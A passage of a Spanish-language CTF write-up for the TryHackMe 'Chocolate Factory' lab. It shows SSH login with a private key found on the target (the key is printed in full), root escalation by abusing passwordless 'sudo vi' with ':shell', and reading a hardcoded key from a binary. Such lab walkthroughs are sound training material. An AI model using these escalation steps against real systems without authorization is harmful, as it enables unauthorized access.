+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+</span></span></code></pre></div><div id="escalada-a-charlie" class="anchor">Escalada a charlie></div>
+<h2 class="relative group">Escalada a charlie 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#escalada-a-charlie" aria-label="Anchor">#</a></span>        
+    
+</h2><p>En el /home/charlie hay un user.txt, pero no tenemos acceso para leerlo. Hay un archivo llamado teleport ahí hay una RSA private key.</p>
+<p>Una llave RSA es una llave generada por el algoritmo RSA. Esta llave está compuesta por dos partes, una parte pública y otra parte privada.</p>
+<p>Desde nuestra máquina guardamos esa key en un archivo llamado id_rsa</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ cat id_rsa
+</span></span><span class="line"><span class="cl">───────┬──────────────────────────────────────────────────────────────────────────────────
+</span></span><span class="line"><span class="cl">       │ File: id_rsa
+</span></span><span class="line"><span class="cl">───────┼──────────────────────────────────────────────────────────────────────────────────
+</span></span><span class="line"><span class="cl">   <span class="m">1</span>   │ -----BEGIN RSA PRIVATE KEY-----
+</span></span><span class="line"><span class="cl">   <span class="m">2</span>   │ MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW
+</span></span><span class="line"><span class="cl">   <span class="m">3</span>   │ 1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb
+</span></span><span class="line"><span class="cl">   <span class="m">4</span>   │ L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj
+</span></span><span class="line"><span class="cl">   <span class="m">5</span>   │ B3zgov7RUtk15Jv11D0Itsyr54pvYhCQgdoorU7l42EZJayIomHKon1jkofd1/oY
+</span></span><span class="line"><span class="cl">   <span class="m">6</span>   │ fOBwgz6JOlNH1jFJoyIZg2OmEhnSjUltZ9mSzmQyv3M4AORQo3ZeLb+zbnSJycEE
+</span></span><span class="line"><span class="cl">   <span class="m">7</span>   │ RaObPlb0dRy3KoN79lt+dh+jSg/dM/TYYe5L4wIDAQABAoIBAD2TzjQDYyfgu4Ej
+</span></span><span class="line"><span class="cl">   <span class="m">8</span>   │ Di32Kx+Ea7qgMy5XebfQYquCpUjLhK+GSBt9knKoQb9OHgmCCgNG3+Klkzfdg3g9
+</span></span><span class="line"><span class="cl">   <span class="m">9</span>   │ zAUn1kxDxFx2d6ex2rJMqdSpGkrsx5HwlsaUOoWATpkkFJt3TcSNlITquQVDe4tF
+</span></span><span class="line"><span class="cl">  <span class="m">10</span>   │ w8JxvJpMs445CWxSXCwgaCxdZCiF33C0CtVw6zvOdF6MoOimVZf36UkXI2FmdZFl
+</span></span><span class="line"><span class="cl">  <span class="m">11</span>   │ kR7MGsagAwRn1moCvQ7lNpYcqDDNf6jKnx5Sk83R5bVAAjV6ktZ9uEN8NItM/ppZ
+</span></span><span class="line"><span class="cl">  <span class="m">12</span>   │ j4PM6/IIPw2jQ8WzUoi/JG7aXJnBE4bm53qo2B4oVu3PihZ7tKkLZq3Oclrrkbn2
+</span></span><span class="line"><span class="cl">  <span class="m">13</span>   │ EY0ndcECgYEA/29MMD3FEYcMCy+KQfEU2h9manqQmRMDDaBHkajq20KvGvnT1U/T
+</span></span><span class="line"><span class="cl">  <span class="m">14</span>   │ RcbPNBaQMoSj6YrVhvgy3xtEdEHHBJO5qnq8TsLaSovQZxDifaGTaLaWgswc0biF
+</span></span><span class="line"><span class="cl">  <span class="m">15</span>   │ uAKE2uKcpVCTSewbJyNewwTljhV9mMyn/piAtRlGXkzeyZ9/muZdtesCgYEA4idA
+</span></span><span class="line"><span class="cl">  <span class="m">16</span>   │ KuEj2FE7M+MM/+ZeiZvLjKSNbiYYUPuDcsoWYxQCp0q8HmtjyAQizKo6DlXIPCCQ
+</span></span><span class="line"><span class="cl">  <span class="m">17</span>   │ RZSvmU1T3nk9MoTgDjkNO1xxbF2N7ihnBkHjOffod+zkNQbvzIDa4Q2owpeHZL19
+</span></span><span class="line"><span class="cl">  <span class="m">18</span>   │ znQV98mrRaYDb5YsaEj0YoKfb8xhZJPyEb+v6+kCgYAZwE+vAVsvtCyrqARJN5PB
+</span></span><span class="line"><span class="cl">  <span class="m">19</span>   │ la7Oh0Kym+8P3Zu5fI0Iw8VBc/Q+KgkDnNJgzvGElkisD7oNHFKMmYQiMEtvE7GB
+</span></span><span class="line"><span class="cl">  <span class="m">20</span>   │ FVSMoCo/n67H5TTgM3zX7qhn0UoKfo7EiUR5iKUAKYpfxnTKUk+IW6ME2vfJgsBg
+</span></span><span class="line"><span class="cl">  <span class="m">21</span>   │ 82DuYPjuItPHAdRselLyNwKBgH77Rv5Ml9HYGoPR0vTEpwRhI/N+WaMlZLXj4zTK
+</span></span><span class="line"><span class="cl">  <span class="m">22</span>   │ 37MWAz9nqSTza31dRSTh1+NAq0OHjTpkeAx97L+YF5KMJToXMqTIDS+pgA3fRamv
+</span></span><span class="line"><span class="cl">  <span class="m">23</span>   │ ySQ9XJwpuSFFGdQb7co73ywT5QPdmgwYBlWxOKfMxVUcXybW/9FoQpmFipHsuBjb
+</span></span><span class="line"><span class="cl">  <span class="m">24</span>   │ Jq4xAoGBAIQnMPLpKqBk/ZV+HXmdJYSrf2MACWwL4pQO9bQUeta0rZA6iQwvLrkM
+</span></span><span class="line"><span class="cl">  <span class="m">25</span>   │ Qxg3lN2/1dnebKK5lEd2qFP1WLQUJqypo5TznXQ7tv0Uuw7o0cy5XNMFVwn/BqQm
+</span></span><span class="line"><span class="cl">  <span class="m">26</span>   │ G2QwOAGbsQHcI0P19XgHTOB7Dm69rP9j1wIRBOF7iGfwhWdi+vln
+</span></span><span class="line"><span class="cl">  <span class="m">27</span>   │ -----END RSA PRIVATE KEY-----
+</span></span><span class="line"><span class="cl">───────┴──────────────────────────────────────────────────────────────────────────────────
+</span></span></code></pre></div><p>Ahora nos podemos conectar por ssh como charlie</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh -i id_rsa charlie@10.10.94.87
+</span></span></code></pre></div><p>Ya somos charlie y podemos ver la flag de usuario</p>
+<div id="escalada-root" class="anchor">Escalada root></div>
+<h2 class="relative group">Escalada root 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#escalada-root" aria-label="Anchor">#</a></span>        
+    
+</h2><p>Con <code>sudo -l</code> podemos ver todos los comandos que charlie puede ejecutar. Ahí podemos ver que el /usr/bin/vi lo puede ejecutar con sudo sin proporcionar contraseña</p>
+<p>vi (Visual) es un programa que entra en la categoría de los editores de texto, pues a diferencia de un procesador de texto no ofrece herramientas para determinar visualmente cómo quedará el documento impreso. Por esto carece de opciones como centrado o justificación de párrafos, pero permite mover, copiar, eliminar o insertar caracteres con mucha versatilidad. Este tipo de programas es frecuentemente utilizado por programadores para escribir código.</p>
+<p>Ejecutar vi como root</p>
+<p><code>sudo vi</code></p>
+<p>ctrl + c</p>
+<p>Y por último escribir :shell en la linea de abajo</p>
+<p><code>:shell</code></p>
+<p>
+
+
+
+
+  
+  
+    
+  
+  
+    <figure>
+      
+      <img
+        class="my-0 rounded-md"
+        srcset="
+        /thm/chocolatefactory/images/root_hub0a3254ffb2d65b16ba2d1c32daea127_98997_330x0_resize_box_3.png 330w,
+        /thm/chocolatefactory/images/root_hub0a3254ffb2d65b16ba2d1c32daea127_98997_660x0_resize_box_3.png 660w,
+        /thm/chocolatefactory/images/root_hub0a3254ffb2d65b16ba2d1c32daea127_98997_1024x0_resize_box_3.png 1024w,
+        /thm/chocolatefactory/images/root_hub0a3254ffb2d65b16ba2d1c32daea127_98997_1320x0_resize_box_3.png 2x"
+        src="/thm/chocolatefactory/images/root_hub0a3254ffb2d65b16ba2d1c32daea127_98997_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+      
+    </figure>
+  
+
+</p>
+<p>¡Ya somos root!</p>
+<div id="rootpy-puertos-100---125" class="anchor">root.py (Puertos 100 - 125)></div>
+<h2 class="relative group">root.py (Puertos 100 - 125) 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#rootpy-puertos-100---125" aria-label="Anchor">#</a></span>        
+    
+</h2><p>En el directorio /root  hay un archivo llamado root.py el cual al ejecutarlo <code>pyhton root.py</code> pide una key: Volviendo al nmap que encontró 25 puertos tcp en los cuales todos pone lo mismo:</p>
+<pre tabindex="0"><code>&#34;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&#34;
+</code></pre><p>Menos uno, el 113, que pone:</p>
+<pre tabindex="0"><code>http://localhost/key_rev_key &lt;- You will find the key here!!!
+</code></pre><p>Cuando entramos al <code>http://10.10.94.87/key_rev_key</code> nos descarga un archivo llamado <code>key_rev_key</code>, al abrirlo nos pide un nombre, e probado con charlie, Mr.Wonka, root, admin, etc&hellip; pero nada.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">chmod +x key_rev_key
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ ./key_rev_key
+</span></span><span class="line"><span class="cl">Enter your name: charlie
+</span></span><span class="line"><span class="cl">Bad name!
+</span></span></code></pre></div><p>Al hacer un nano al archivo hay una línea que pone:</p>
+<pre tabindex="0"><code>congratulations you have found the key:   ^@^@^@^@b&#39;-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=&#39;^@`
+</code></pre><p>¡Ya tenemos la key!</p>
+<p>También hay otra línea en la cual se puede ver el nombre correcto</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Enter your name:  %s  laksdhfas  
+</span></span></code></pre></div><pre tabindex="0"><code>❯ ./key_rev_key
+Enter your name: laksdhfas
+
+ congratulations you have found the key:   b&#39;-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=&#39;
+ Keep its safe
+</code></pre><div id="root-flag" class="anchor">Root flag></div>
+<h2 class="relative group">Root flag 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#root-flag" aria-label="Anchor">#</a></span>        
+    
+</h2><p>Ahora ya podemos ejecutar el <code>root.py</code> que está en <code>/root</code> y poner la key.</p>
+<p>¡Nos responde con la flag de root!</p>
+
+        </br></br>
+        
+
+      </div>
+      <script>
+        var oid = "views_THM\/ChocolateFactory\/index.md"
+        var oid_likes = "likes_THM\/ChocolateFactory\/index.md"
+      </script>
+      
+      
+      <script type="text/javascript" src="/js/page.min.0e49973b4ad0a382c7c6012d8bff8226316642daabc4f8a20477bd08674f3da6e2fa993bc20ad4f51e7c5bb68e6f913a207a7c4fe37ea0e7b806894afce0a64e.js" integrity="sha512-DkmXO0rQo4LHxgEti/&#43;CJjFmQtqrxPiiBHe9CGdPPabi&#43;pk7wgrU9R58W7aOb5E6IHp8T&#43;N&#43;oOe4BolK/OCmTg=="></script>
+  </section>
+  <footer class="pt-8 max-w-prose print:hidden">
+
+    
+
+
+    
+    
+    
+
+    
+
+    
+
+    
+  
+  <section class="flex flex-row flex-wrap justify-center pt-4 text-xl">
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://d3b0o.github.io/thm/chocolatefactory/&amp;title=Resoluci%c3%b3n%20Chocolate%20Factory"
+      title="Share on LinkedIn"
+      aria-label="Share on LinkedIn"
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+
+  </span>
+
+
+    </a>
+      
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://twitter.com/intent/tweet/?url=https://d3b0o.github.io/thm/chocolatefactory/&amp;text=Resoluci%c3%b3n%20Chocolate%20Factory"
+      title="Tweet on Twitter"
+      aria-label="Tweet on Twitter"
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
+
+  </span>
+
+
+    </a>
+      
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://reddit.com/submit/?url=https://d3b0o.github.io/thm/chocolatefactory/&amp;resubmit=true&amp;title=Resoluci%c3%b3n%20Chocolate%20Factory"
+      title="Submit to Reddit"
+      aria-label="Submit to Reddit"
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M201.5 305.5c-13.8 0-24.9-11.1-24.9-24.6 0-13.8 11.1-24.9 24.9-24.9 13.6 0 24.6 11.1 24.6 24.9 0 13.6-11.1 24.6-24.6 24.6zM504 256c0 137-111 248-248 248S8 393 8 256 119 8 256 8s248 111 248 248zm-132.3-41.2c-9.4 0-17.7 3.9-23.8 10-22.4-15.5-52.6-25.5-86.1-26.6l17.4-78.3 55.4 12.5c0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.3 24.9-24.9s-11.1-24.9-24.9-24.9c-9.7 0-18 5.8-22.1 13.8l-61.2-13.6c-3-.8-6.1 1.4-6.9 4.4l-19.1 86.4c-33.2 1.4-63.1 11.3-85.5 26.8-6.1-6.4-14.7-10.2-24.1-10.2-34.9 0-46.3 46.9-14.4 62.8-1.1 5-1.7 10.2-1.7 15.5 0 52.6 59.2 95.2 132 95.2 73.1 0 132.3-42.6 132.3-95.2 0-5.3-.6-10.8-1.9-15.8 31.3-16 19.8-62.5-14.9-62.5zM302.8 331c-18.2 18.2-76.1 17.9-93.6 0-2.2-2.2-6.1-2.2-8.3 0-2.5 2.5-2.5 6.4 0 8.6 22.8 22.8 87.3 22.8 110.2 0 2.5-2.2 2.5-6.1 0-8.6-2.2-2.2-6.1-2.2-8.3 0zm7.7-75c-13.6 0-24.6 11.1-24.6 24.9 0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.1 24.9-24.6 0-13.8-11-24.9-24.9-24.9z"/></svg>
+
+  </span>
+
+
+    </a>
+      
+    
+      
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://www.facebook.com/sharer/sharer.php?u=https://d3b0o.github.io/thm/chocolatefactory/&amp;quote=Resoluci%c3%b3n%20Chocolate%20Factory"
+      title="Share on Facebook"
+      aria-label="Share on Facebook"
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"/></svg>
+
+  </span>
+
+
+    </a>
+      
+    
+  </section>
+
+
+    
+  
+    
+    
+    
+      
+      
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="flex group mr-3" href="/thm/lazyadmin/">
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Resolución Lazy admin</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2022-12-14 00:00:00 &#43;0000 UTC">14/12/2022</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="flex text-right group ml-3" href="/thm/rootme/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Resolución CTF RootMe</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2022-12-11 00:00:00 &#43;0000 UTC">11/12/2022</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+    
+  </footer>
+</article>
+
+      
+    </main><footer class="py-10 print:hidden">
+  
+  
+    
+  
+  <div class="flex items-center justify-between">
+
+    
+    
+    <p class="text-sm text-neutral-500 dark:text-neutral-400">
+      &copy;
+      2023
+      d3b0o
+    </p>
+    
+
+    
+    
+    <p class="text-xs text-neutral-500 dark:text-neutral-400">
+      
+      
+      Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+        href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+        href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
+    </p>
+    
+
+  </div>
+  <script>
+    
+    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+      margin: 24,
+      background: 'rgba(0,0,0,0.5)',
+      scrollOffset: 0,
+    })
+    
+  </script>
+  
+  
+  <script type="text/javascript" src="/js/process.min.2166d3adac1679c00a75161830ab5725d3efc0e3d3f8c2453fb01d0907948436c25f0f8a7ad824322fa22f3f9c85fd4d0a1d5c856f53b862157da25a57dc3d52.js" integrity="sha512-IWbTrawWecAKdRYYMKtXJdPvwOPT&#43;MJFP7AdCQeUhDbCXw&#43;KetgkMi&#43;iLz&#43;chf1NCh1chW9TuGIVfaJaV9w9Ug=="></script>
+  
+  
+</footer><div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
+  data-url="https://d3b0o.github.io/"
+  style="z-index:500"
+>
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"
+  >
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0"
+        />
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)"
+      >
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+  </div>
+</body>
+
+</html>
